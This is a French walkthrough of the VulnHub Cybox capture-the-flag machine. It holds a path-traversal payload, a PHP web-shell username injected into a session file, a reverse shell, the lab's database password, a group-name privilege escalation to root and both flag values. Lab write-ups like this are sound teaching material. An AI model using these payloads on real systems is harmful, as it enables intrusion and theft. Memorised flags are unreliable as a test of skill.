# Solution du CTF Cybox de VulnHub

[Cybox](https://vulnhub.com/entry/cybox-11,607/) est un CTF de type boot2root proposé sur VulnHub. Il y a deux flags à récupérer.

Ce CTF m'a donné une impression de déjà vu, pas parce qu'il ressemble à d'autres challenges mais plutôt que je suspecte de l'avoir tenté il y a quelques années sans aller au boût (ce qui expliquerait que je n'ai pas écrit de writeup jusqu'à présent).

C'est donc le retour de la vengeance :D

```
Nmap scan report for 192.168.56.102
Host is up (0.00050s latency).
Not shown: 65445 filtered tcp ports (no-response), 83 filtered tcp ports (port-unreach)
PORT    STATE  SERVICE    VERSION
21/tcp  open   ftp        vsftpd 3.0.3
25/tcp  open   smtp       Postfix smtpd
|_smtp-commands: cybox.Home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=cybox
| Not valid before: 2020-11-10T23:31:36
|_Not valid after:  2030-11-08T23:31:36
53/tcp  closed domain
80/tcp  open   http       Apache httpd 2.2.17 ((Unix) mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15)
|_http-title: CYBOX
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.17 (Unix) mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15
110/tcp open   pop3       Courier pop3d
|_pop3-capabilities: USER TOP LOGIN-DELAY(10) PIPELINING IMPLEMENTATION(Courier Mail Server) UIDL
143/tcp open   imap       Courier Imapd (released 2011)
|_imap-capabilities: CHILDREN OK CAPABILITY completed QUOTA UIDPLUS NAMESPACE ACL2=UNIONA0001 SORT ACL THREAD=REFERENCES IMAP4rev1 IDLE THREAD=ORDEREDSUBJECT
443/tcp open   ssl/https?
|_ssl-date: 2022-11-15T15:44:28+00:00; -1s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=cybox.company/organizationName=Cybox Company/stateOrProvinceName=New York/countryName=US
| Not valid before: 2020-11-14T15:06:32
|_Not valid after:  2021-11-14T15:06:32
```

On peut voit dans le certificat SSL une mention du DNS `cybox.company`. On la retrouve aussi sur le site hébergé sur le port 80 qui laisse une adresse email [admin@cybox.company](mailto:admin@cybox.company).

On va donc utiliser ffuf pour énumérer les différents hôtes virtuels que supporte le serveur web :

```shellsession
$ ffuf -w fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.102/ -H "Host: FUZZ.cybox.company" -fs 8514

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.102/
 :: Wordlist         : FUZZ: fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt
 :: Header           : Host: FUZZ.cybox.company
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 8514
________________________________________________

webmail                 [Status: 302, Size: 0, Words: 1, Lines: 1]
dev                     [Status: 200, Size: 209, Words: 18, Lines: 11]
monitor                 [Status: 302, Size: 0, Words: 1, Lines: 1]
register                [Status: 200, Size: 1252, Words: 217, Lines: 74]
ftp                     [Status: 200, Size: 5295, Words: 645, Lines: 68]
:: Progress: [50000/50000] :: Job [1/1] :: 3296 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
```

On va jeter un oeil à chacun de ces sites, et effectuer s'il le faut une énumération avec `feroxbuster`.

## cybox.company

Une énumération sur le site principal (`cybox.company`) ne retourne rien d'intéressant. Il y a bien un 403 sur `/phpmyadmin` mais cette restriction s'applique à tous les autres hôtes virtuels, il s'agit donc plus d'une réponse par défaut (genre règle Apache) qu'à la vrai présence d'un *phpMyAdmin*.

## dev.cybox.company

Sur le sous domaine `dev` le listing est activé et on ne trouve q'un fichier `phpinfo.php`. Ce dernier mentionne *Bitnami* qui est le gestionnaire de paquet qui a été utilisé pour installer LAMP.

On note que le `DOCUMENT_ROOT` correspond à `/opt/bitnami/apache2/htdocs/dev`. Les autres hôtes virtuels sont sans doute aussi présent dans le dossier `htdocs`.

## webmail.cybox.company

Le sous domaine `webmail` correspond à une installation de `SquirrelMail version 1.4.22`.

Il y a quelques exploits pour *SquirrelMail* sur exploit-db mais après recherche plus poussée aucun ne semble toucher cette version.

## ftp.cybox.company

On y trouve une install de [net2ftp](https://www.net2ftp.com/), un client FTP écrit en PHP.  Sur exploit-db il y a une vulnérabilité d'inclusion PHP mais le net2ftp n'indique pas sa version. Quoiqu'il en soit l'exploit mentionne un script vulnérable touchant la skin (thème graphique) *"mobile"* mais ce dernier est manquant sur le CTF. En appliquant au thème présent sur l'install je n'obtiens pas la faille qui doit être spécifique à cette skin.

## monitor.cybox.company

Le site est intéressant car il semble avoir être fait spécifiquement pour le CTF en raison du pied de page `© 2020 Monitor from Cybox`.

On arrive tout de suite sur une mire de connexion mais il est possible de s'enregistrer. Le formulaire demande un nom d'utilisateur, une adresse email et mot de passe.

Après avoir créé un compte et m'être enregistré je découvre qu'il s'agit d'une sorte de pointeuse en ligne : un bouton pour indiquer son arrivée et un autre pour indiquer son départ. L'utilisation de ces boutons émet une requête Ajax mais en GET sans paramètres.

Le cookie est le classique `PHPSESSID` et les deux formulaires (login et register) semblent solides. Il est temps de fouiller ailleurs mais je garde en mémoire le fait qu'il y a aussi un formulaire de reset du mot de passe.

## register.cybox.company

Ce site affiche un simple formulaire avec le titre `Create users` et un bouton `CREATE`. Une fois mon login soumis (avec l'adresse `devloop@cybox.company`)  j'obtiens la réponse suivante :

> devloop@cybox.company has been created successfully.
> 
> The credentials are devloop:devloop.
> 
> You should change your default password for security.

Intéressant, le script semble m'avoir créé un compte email sur le système. Je peux me connecter sur le webmail mais je n'ai bien sûr aucun message dans ma boîte.

## ~~My~~ Your password is ...

Je retourne sur `monitor.cybox.company` et je saisis mon adresse `devloop@cybox.company` dans le formulaire de reset de mot de passe.

Cette fois dans le webmail j'ai reçu un email en provenance de `daemon` avec un lien pour changer mon mot de passe :

> Hello user, here is the link to update your password in Cybox Monitor:
> http://monitor.cybox.company/updatePasswordRequest.php?email=devloop@cybox.company

On remarque que l'adresse email est donnée en paramètre au script au lieu d'y trouver un hash unique permettant le changement de mot de passe.

Je charge donc cette URL mais en mettant admin@cybox.company à la place. Le formulaire accepte le changement de mot de passe sans broncher.

Je peux désormais me connecter sur `Monitor` en tant qu'admin mais là déception : le nouveau lien `Admin panel` retourne une indication *Under construction*.

En étant un peu curieux on remarque dans le code HTML l'utilisation d'un script PHP pour obtenir la stylesheet du site, ce qui est surprenant :

```html
<link href="styles.php?style=general" type="text/css" rel="stylesheet">
```

Je passe ça directement à `Wapiti`. Comme la page est accessible seulement si connecté en tant qu'administrateur il faut aussi spécifier le cookie :

```bash
wapiti -u "http://monitor.cybox.company/admin/styles.php?style=general" --scope url -H "Cookie: PHPSESSID=q1raqsm48b1g4u94cie9j4b6r3;" -v2 --color
```

Une faille de directory traversal est aussitôt détectée :

```
---
Linux local file disclosure vulnerability in http://monitor.cybox.company/admin/styles.php via injection in the parameter style
Evil request:
    GET /admin/styles.php?style=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 HTTP/1.1
    host: monitor.cybox.company
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    cookie: PHPSESSID=q1raqsm48b1g4u94cie9j4b6r3;
---
```

Pour vérifier que le script PHP fait une interprétation du code PHP lut et non une simple lecture je passe le chemin du script `phpinfo` vu plus tôt (`/opt/bitnami/apache2/htdocs/dev/phpinfo.php`) et j'obtiens bien l'output espéré :)

## loggedin

Maintenant il faut transformer notre LFI en RCE. La technique classique consiste à charger un fichier de log d'Apache dans lequel on aura injecté notre code PHP par exemple en émettant une requête HTTP avec le code dans l'entête HTTP `User-Agent`.

On peut connaître le chemin de ces fichiers en chargeant le fichier de configuration d'Apache (`/opt/bitnami/apache2/conf/httpd.conf`) que l'on aura déduit à partir du phpinfo.

Dans mon cas c'est un peu raté car à force de bourriner avec `feroxbuster` et `Wapiti` le chargement des logs provoque une erreur 500, les requêtes ont du mettre les fichiers en vrac.

Une autre technique consiste à charger le fichier de session PHP stocké sur le serveur. Son nom a généralement un prefixe `sess_` suivi de l'identifiant `PHPSESSID`. Le path des sessions est indiqué dans le phpinfo. On final je n'ai qu'à charger le fichier suivant :

`/opt/bitnami/php/tmp/sess_q1raqsm48b1g4u94cie9j4b6r3`

Et j'obtiens cet output :

`loggedin|b:1;id|i:1;email|s:19:"admin@cybox.company";name|s:5:"Admin";rank|i:1;`

On voit que la session porte à la fois le nom d'utilisateur et l'adresse email de l'utilisateur. Par conséquent je créé un autre compte sur `Monitor` depuis un autre navigateur dont le nom d'utilisateur sera `<?php system($_GET['cmd']); ?>`.

Quan je charge le fichier de session correspondant le PHP est interprété et je peux spécifier la commande à exécuter (ici avec `id`) :

`loggedin|b:1;id|i:7;email|s:21:"devloop@cybox.company";name|s:30:"uid=1(daemon) gid=1(daemon) groups=1(daemon) ";rank|i:0;`

La commande `uname` montre que le système est 32 bits :

`Linux cybox 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU/Linux`

Je rappatrie donc un reverse-ssh x86. Les règles egress semblent bloquer les ports hauts mais en écoutant sur le port 80 j'obtiens mon reverse shell.

J'attéris dans le dossier contenant le script vulnérable :

```php
<?php
session_start();

if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION["rank"] == 0){
    header("Location: ../login.php");
    exit;
}

include("styles/".$_GET['style'].".css");
?>
```

Je trouve aussi des identifiants MySQL mais ceux-çi ne semblent pas utiles :

```php
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'tufl1yK1QnZDjULV5JjN');
define('DB_NAME', 'monitor');
```

Au moins mes privilèges courant permettent l'accès au premier flag :

```shellsession
daemon@cybox:/home/cybox$ cat user.txt 
d85da08f1a31ef96fb6d4f608611bca2
```

Le seul point particulier du système est le binaire setuid `registerlauncher` dans `/opt` :

```shellsession
daemon@cybox:/tmp$ ls /opt/
total 24
drwxr-xr-x  3 root root 4096 Dec  6  2020 .
drwxr-xr-x 22 root root 4096 Nov 11  2020 ..
drwxr-xr-x 10 root root 4096 Nov 11  2020 bitnami
-rwxr-xr-x  1 root root  968 Dec  6  2020 register
-rwsr-sr-x  1 root root 7400 Nov 14  2020 registerlauncher
```

## Enchanté, M. Utilisateurs privilégiés

Une analyse très rapide avec [Cutter](https://github.com/rizinorg/cutter) montre que le binaire est safe. Il effectue juste un `setuid(0)` avant de faire un `exec` sur `/opt/register`.

On ne peut donc pas exploiter le PATH ni même un buffer overflow car rien n'est copié.

Le binaire n'est pas vulnérable à `Shellshock`, sans doute parce que la fonction `system()` n'est pas utilisée.

Le script `register` appelé est le suivant :

```bash
#!/bin/bash

USERNAME=$1

if [ ! "$USERNAME" ]
then
    /bin/echo -e "Syntax: Username"
    exit 1
fi

if [[ "$USERNAME" =~ [^a-z] ]]; then
   /bin/echo -e "Think twice before putting something :)"
   exit 0
fi

if /usr/bin/id "$USERNAME" >/dev/null 2>&1; then
    /bin/echo -e "User already exists :("
    exit 0
fi

if [ ! "$(/bin/cat /etc/group | /bin/grep -w "$USERNAME")" ]
then
    /usr/sbin/groupadd "$USERNAME" 2>/dev/null
fi

/usr/sbin/useradd -p "$(/usr/bin/openssl passwd -1 "$USERNAME")" -m "$USERNAME" -g "$USERNAME" -s /bin/bash 2>/dev/null

/usr/bin/maildirmake /home/"$USERNAME"/Maildir/ -R 2>/dev/null

/bin/chown "$USERNAME":"$USERNAME" /home/"$USERNAME"/Maildir/ -R 2>/dev/null

if [ $? -eq 0 ]; then
    /bin/echo -e "$USERNAME@cybox.company has been created successfully. The credentials are $USERNAME:$USERNAME. You should change your default password for security."
else
    /bin/echo -e "The string must contain a maximum of 32 characters."
fi
```

C'est visiblement le même script qui était appelé depuis `register.cybox.company`.

Le script n'est pas vulnérable à une injection de commande car la valeur `$USERNAME` est systématiquement mise entre double-quotes.

Le script n'est pas non plus vulnérable à une race-condition. L'idée qui m'est venue est qu'entre le `useradd` et le `chown` on dispose d'assez de temps pour créer un lien symbolique de `Maildir` vers `/etc/sudoers` ou `/etc/shadow`.

Seulement :

* si on créé un lien symbolique dans `Maildir`, `chown -R` ne suit pas les liens symboliques

* si on crée un lien symbolique `Maildir` la commande `chown` indiquera que `Maildir/` n'est pas un dossier

Au final le seul élément vulnérable c'est l'affectation du groupe par `useradd` à l'utilisateur : le script vérifie que l'utilisateur n'existe pas déjà mais ne fait pas la même chose pour le groupe. Si on choisi de créer un utilisateur nommé après un groupe privilégié il y a moyen d'augmenter nos privilèges.

Généralement les utilisateurs du groupe `sudo` peuvent passer root :

```shellsession
daemon@cybox:/opt$ ./registerlauncher sudo 
sudo@cybox.company has been created successfully. The credentials are sudo:sudo. You should change your default password for security.
daemon@cybox:/opt$ su sudo
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

sudo@cybox:/opt$ sudo su
[sudo] password for sudo: 
root@cybox:/opt# cd /root/
root@cybox:~# ls
Maildir  root.txt
root@cybox:~# cat root.txt 
4c0183fdd736e2b8fb3f57ddbfa8ce36
```

C'est bien la première fois que je fais un `su sudo` au lieu d'un `sudo su` :D

Alternativement `LinPEAS` indiquait que le système est vulnérable à `DirtyCOW`  et `Sudo Baron Samedit`.

*Publié le 16 novembre 2022*
